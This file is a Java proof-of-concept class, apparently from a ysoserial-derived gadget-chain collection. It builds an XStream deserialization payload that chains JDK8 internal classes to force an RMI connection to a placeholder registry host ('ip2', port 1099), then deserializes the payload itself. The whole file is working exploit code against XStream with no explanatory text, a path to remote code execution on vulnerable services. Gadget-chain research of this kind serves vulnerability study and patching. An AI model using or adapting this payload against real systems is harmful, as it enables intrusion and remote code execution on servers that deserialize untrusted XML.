package ysoserial.payloads.tabbyGadgetChains.Jdk8;

import com.thoughtworks.xstream.XStream;

public class Poc6 {
    public static void main(String[] args) {
        String poc ="<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "      <type>12345</type>\n" +
                "      <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n" +
                "        <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: <none></m__obj>\n" +
                "      </value>\n" +
                "    </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "    <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "      <type>12345</type>\n" +
                "      <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>\n" +
                "        <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\n" +
                "          <parsedMessage>true</parsedMessage>\n" +
                "          <soapVersion>SOAP_11</soapVersion>\n" +
                "          <bodyParts/>\n" +
                "          <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\n" +
                "            <attachmentsInitialized>false</attachmentsInitialized>\n" +
                "            <multiPart class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\n" +
                "              <soapPart/>\n" +
                "              <mm>\n" +
                "                <it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\n" +
                "                  <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>\n" +
                "                    <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>\n" +
                "                      <names>\n" +
                "                        <string>aa</string>\n" +
                "                        <string>aa</string>\n" +
                "                      </names>\n" +
                "                      <ctx>\n" +
                "                        <environment/>\n" +
                "                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>\n" +
                "                          <java.rmi.server.RemoteObject>\n" +
                "                            <string>UnicastRef</string>\n" +
                "                            <string>ip2</string>\n" +
                "                            <int>1099</int>\n" +
                "                            <long>0</long>\n" +
                "                            <int>0</int>\n" +
                "                            <short>0</short>\n" +
                "                            <boolean>false</boolean>\n" +
                "                          </java.rmi.server.RemoteObject>\n" +
                "                        </registry>\n" +
                "                        <host>ip2</host>\n" +
                "                        <port>1099</port>\n" +
                "                      </ctx>\n" +
                "                    </candidates>\n" +
                "                  </aliases>\n" +
                "                </it>\n" +
                "              </mm>\n" +
                "            </multiPart>\n" +
                "          </sm>\n" +
                "        </message>\n" +
                "      </value>\n" +
                "    </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        XStream xstream = new XStream();
        xstream.fromXML(poc);
    }
}
